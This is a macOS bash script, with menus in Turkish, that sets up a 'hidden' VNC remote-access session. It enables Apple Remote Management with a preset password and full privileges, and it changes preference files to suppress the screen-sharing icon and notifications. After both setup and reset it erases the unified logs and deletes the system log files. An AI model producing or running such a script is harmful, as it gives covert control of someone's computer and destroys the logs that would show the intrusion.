#!/bin/bash


set_password="şifrenizi_buraya_girin"

display_vnc_info() {
  local ip_address=$(for interface in $(networksetup -listallhardwareports | grep -o 'en[0-9]*'); do ipconfig getifaddr $interface 2>/dev/null && break; done)
  if [ -z "$ip_address" ]; then
    echo "Error: Unable to determine IP address. Make sure you are connected to a network."
    exit 1
  fi
  echo "VNC Oturumu Detayları:"
  echo "Bağlantı: vnc://$ip_address:5900"
  echo "Şifre: $set_password"
}

setup_vnc() {
  echo "Setting up hidden VNC session..."

  local kickstart_cmd="sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"
  local configure_cmd="-activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpassword \"$set_password\" -restart -agent -privs -all"

  "$kickstart_cmd" $configure_cmd
  if [ $? -ne 0 ]; then
    echo "Error: Failed to configure Remote Management."
    exit 1
  fi

  sudo cp /Library/Preferences/com.apple.RemoteManagement.plist /Library/Preferences/com.apple.RemoteManagement.plist.backup || {
    echo "Error: Failed to backup plist file.";
    exit 1;
  }

  sudo defaults write /Library/Preferences/com.apple.RemoteManagement.plist ARD_AllLocalUsersPrivs -int 0
  if [ $? -ne 0 ]; then
    echo "Error: Failed to modify plist to disable on-screen notifications."
    exit 1
  fi

  sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist ShowBonjourServices -bool false
  if [ $? -ne 0 ]; then
    echo "Error: Failed to modify plist to disable Screen Sharing status icon."
    exit 1
  fi

  "$kickstart_cmd" -restart -agent
  if [ $? -ne 0 ]; then
    echo "Error: Failed to restart Remote Management agent."
    exit 1
  fi

  echo "Hidden VNC setup completed."
  display_vnc_info
}

reset_vnc() {
  echo "Disarming VNC session and resetting Remote Management settings..."

  local kickstart_cmd="sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"
  "$kickstart_cmd" -deactivate -configure -access -off
  if [ $? -ne 0 ]; then
    echo "Error: Failed to deactivate Remote Management."
    exit 1
  fi

  sudo defaults write /Library/Preferences/com.apple.ScreenSharing.plist ShowBonjourServices -bool true
  if [ $? -ne 0 ]; then
    echo "Error: Failed to restore Screen Sharing status icon."
    exit 1
  fi

  if [ -f /Library/Preferences/com.apple.RemoteManagement.plist.backup ]; then
    sudo mv /Library/Preferences/com.apple.RemoteManagement.plist.backup /Library/Preferences/com.apple.RemoteManagement.plist || {
      echo "Error: Failed to restore plist file.";
      exit 1;
    }
    echo "Restored original plist settings."
  fi

  echo "VNC session disarmed and Remote Management disabled."
}

clear_logs() {
  echo "Clearing system logs..."
  sudo log erase --all || {
    echo "Error: Failed to clear unified logs.";
    exit 1;
  }
  sudo rm -f /var/log/asl/*
  sudo rm -f /var/log/system.log*
  sudo rm -f /var/log/DiagnosticMessages/*
  echo "System logs cleared."
}

clear

echo "macOS Gizli VNC kurulum scripti"
echo "------------------------------------"
echo "1. Gizli VNC Bağlantısı oluştur"
echo "2. Devre Dışı Bırakma ve Sıfırlama Değişiklikleri"
echo "3. Çıkış"

while true; do
  read -p "Enter your choice: " choice
  if [[ "$choice" =~ ^[1-3]$ ]]; then
    break
  else
    echo "Invalid input. Please enter a number between 1 and 3."
  fi
done

case $choice in
  1)
    setup_vnc
    clear_logs
    ;;
  2)
    reset_vnc
    clear_logs
    ;;
  3)
    echo "Çıkılıyor..."
    ;;
  *)
    echo "Invalid choice. Exiting..."
    ;;
esac